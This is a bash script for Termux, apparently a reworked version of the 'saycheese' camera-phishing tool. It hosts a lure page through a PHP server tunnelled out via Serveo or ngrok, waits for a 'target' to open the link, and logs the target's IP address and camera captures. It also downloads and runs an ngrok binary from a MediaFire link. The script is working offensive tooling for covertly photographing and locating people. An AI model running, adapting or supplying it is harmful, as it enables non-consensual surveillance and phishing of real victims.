#!/bin/bash
# Modified version of: github.com/thelinuxchoice/saycheese
# Reworked by: vraxyxx / Noob Hackers
clear

termux-setup-storage
pkg install php wget unzip -y

trap 'printf "\n"; stop' 2

banner() {
clear
echo '
                             __
                         __ /_/\___
                        /__/[]\/__/|o-_
                        |    _     ||   -_  
                        |  ((_))   ||     -_
                        |__________|/

                           __     _______ ____  _   _ 
 \ \   / / ____|  _ \| \ | |
  \ \ / /|  _| | |_) |  \| |
   \ V / | |___|  _ <| |\  |
    \_/  |_____|_| \_\_| \_|
             ___  ____   __   ____   ___   __   _  _ 
            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
            \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_)& v1.1
' | lolcat

echo -e "\n\e[1;77m v1.1 modified by github.com/vraxyxx/vern\e[0m"
echo -e "\e[1;92mNote:\e[0m Turn ON your Hotspot before continuing!"
}

stop() {
    pkill -f ngrok >/dev/null 2>&1
    pkill -f php >/dev/null 2>&1
    pkill -f ssh >/dev/null 2>&1
    exit 1
}

dependencies() {
    command -v php >/dev/null 2>&1 || { echo "PHP is required but not installed. Exiting."; exit 1; }
    command -v wget >/dev/null 2>&1 || { echo "wget is required but not installed. Exiting."; exit 1; }
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    echo -e "\e[1;93m[+]\e[0m IP: \e[1;77m$ip\e[0m"
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    echo -e "\n\e[1;92m[*] Waiting for target. Press Ctrl + C to exit...\e[0m"
    while true; do
        if [[ -e "ip.txt" ]]; then
            echo -e "\n\e[1;92m[+]\e[0m Target opened the link!"
            catch_ip
            rm -rf ip.txt
        fi

        if [[ -e "Log.log" ]]; then
            echo -e "\n\e[1;92m[+]\e[0m Camera file received!"
            rm -rf Log.log
        fi
        sleep 0.5
    done
}

server() {
    command -v ssh >/dev/null 2>&1 || { echo "ssh is required but not installed. Exiting."; exit 1; }

    echo -e "\e[1;77m[+]\e[0m Starting Serveo.net server..."

    fuser -k 3333/tcp >/dev/null 2>&1
    php -S localhost:3333 >/dev/null 2>&1 &

    if [[ $subdomain_resp == true ]]; then
        ssh -o StrictHostKeyChecking=no -R "$subdomain:80:localhost:3333" serveo.net > sendlink 2>/dev/null &
    else
        ssh -o StrictHostKeyChecking=no -R 80:localhost:3333 serveo.net > sendlink 2>/dev/null &
    fi

    sleep 10
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    echo -e "\e[1;93m[+]\e[0m Direct link: \e[1;77m$send_link\e[0m"
}

payload() {
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    sed "s+forwarding_link+$send_link+g" grabcam.html > index2.html
    sed "s+forwarding_link+$send_link+g" template.php > index.php
}

payload_ngrok() {
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    sed "s+forwarding_link+$link+g" grabcam.html > index2.html
    sed "s+forwarding_link+$link+g" template.php > index.php
}

ngrok_server() {
    [[ -e ngrok ]] || {
        echo -e "\e[1;92m[+]\e[0m Downloading Ngrok..."
        wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip -O ngrok.zip
        unzip ngrok.zip >/dev/null 2>&1
        chmod +x ngrok
        rm -f ngrok.zip
    }

    php -S 127.0.0.1:3333 >/dev/null 2>&1 &
    sleep 2
    ./ngrok http 3333 >/dev/null 2>&1 &
    sleep 10
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    echo -e "\e[1;92m[*]\e[0m Direct link: \e[1;77m$link\e[0m"

    payload_ngrok
    checkfound
}

start1() {
    rm -f sendlink

    echo -e "\n\e[1;92m[01]\e[0m Serveo.net"
    echo -e "\e[1;92m[02]\e[0m Ngrok"
    read -p $'\n\e[1;92m[+]\e[0m Choose Port Forwarding option [default 1]: ' option_server
    option_server="${option_server:-1}"

    case "$option_server" in
        1) start ;;
        2) ngrok_server ;;
        *) echo -e "\e[1;93m[!] Invalid option!\e[0m"; sleep 1; clear; start1 ;;
    esac
}

start() {
    default_subdomain="grabcam$RANDOM"
    read -p $'\e[1;33m[+]\e[0m Choose custom subdomain? [Y/n]: ' choose_sub
    choose_sub="${choose_sub:-Y}"

    if [[ $choose_sub =~ ^[Yy]$ ]]; then
        subdomain_resp=true
        read -p $'\e[1;33m[+]\e[0m Subdomain (default: '"$default_subdomain"$'): ' subdomain
        subdomain="${subdomain:-$default_subdomain}"
    fi

    server
    payload
    checkfound
}

banner
dependencies
start1